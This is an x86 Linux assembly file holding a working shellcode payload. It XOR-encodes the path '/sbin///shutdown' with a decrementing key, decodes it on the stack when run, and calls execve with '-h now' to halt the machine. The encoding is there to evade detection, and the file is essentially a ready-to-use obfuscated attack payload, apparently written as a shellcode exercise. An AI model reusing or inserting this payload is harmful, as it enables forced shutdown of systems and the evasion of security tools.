;
; Filename: shutdown-h-now_xored.asm
; Author:   Fernando Benedictti
;

global _start

segment .text

_start:
  xor eax, eax
  xor ecx, ecx
  cdq                        ; old: xor edx,edx
  push eax
  push word 0x682d
  mov esi, esp
  push eax
  push byte +0x6e
  mov word [esp+0x1], 0x776f
  mov edi, esp
  push eax

  ; xored with initial value: 0x38 (decrementing)
  ; push dword 0x6e776f64
  push dword 0x58425b57
  ; push dword 0x74756873
  push dword 0x4644585c
  ; push dword 0x2f2f2f6e
  push dword 0x01020345
  ; push dword 0x6962732f
  push dword 0x434b5b08

  mov ah, 0x36
  mov al, 0x26
_decode:
  inc al
  mov bl, [esp + ecx]
  xor bl, al
  mov [esp + ecx], bl
  inc ecx
  cmp ah, al
  jne _decode

  xor eax, eax
  mov ebx, esp
  push edx
  push esi
  push edi
  push ebx
  mov ecx, esp
  mov al, 0xb
  int 0x80
